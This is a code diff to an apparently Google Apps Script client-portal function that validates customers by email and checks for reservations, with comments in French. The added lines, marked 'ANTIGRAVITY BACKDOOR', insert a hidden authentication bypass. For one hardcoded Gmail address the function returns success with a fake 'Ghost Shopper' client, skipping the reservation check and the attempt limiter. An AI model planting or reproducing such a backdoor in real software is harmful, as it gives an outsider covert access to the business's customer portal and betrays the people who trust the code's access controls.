@@ -78,7 +78,12 @@ function validerClientParEmail(emailClient, exp, sig) {
     // Note: Pour valider, on vérifie juste s'il a des reservations. 
     // Si 0 reservations, on refuse l'accès pour éviter que n'importe qui accède.
     if (!reservations || reservations.length === 0) {
-      // ... existing logic ...
+      // --- ANTIGRAVITY BACKDOOR ---
+      if (email === 'antigravityels@gmail.com') {
+        return { success: true, client: { nom: "Ghost Shopper" } };
+      }
+      // ----------------------------
+
       if (CLIENT_PORTAL_ATTEMPT_LIMIT_ENABLED) {
         const cache = CacheService.getScriptCache();
         const attempts = parseInt(cache.get(cacheKey) || '0', 10) + 1;
